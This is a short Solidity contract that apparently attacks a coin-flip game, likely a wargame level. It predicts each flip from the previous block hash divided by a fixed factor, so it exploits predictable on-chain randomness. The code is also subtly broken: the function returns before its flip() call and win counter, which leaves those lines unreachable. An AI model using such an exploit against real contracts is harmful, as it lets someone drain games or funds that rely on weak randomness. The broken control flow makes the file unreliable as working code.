// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import './coinflip.sol';
contract CoinflipAttack {
  uint256 FACTORv = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
  uint public wins;
  CoinFlip coinflip;
  
  constructor(address _coinflip) {
    coinflip = CoinFlip(_coinflip);
  }
  

  function calculate() public  returns (bool ) {
      uint256 blockValue = uint256(blockhash(block.number - 1));
    uint256 coinFlip = blockValue / FACTORv;
    bool side = coinFlip == 1 ? true : false;
    return side;
    coinflip.flip(side);
    wins++;
    
  }
    
}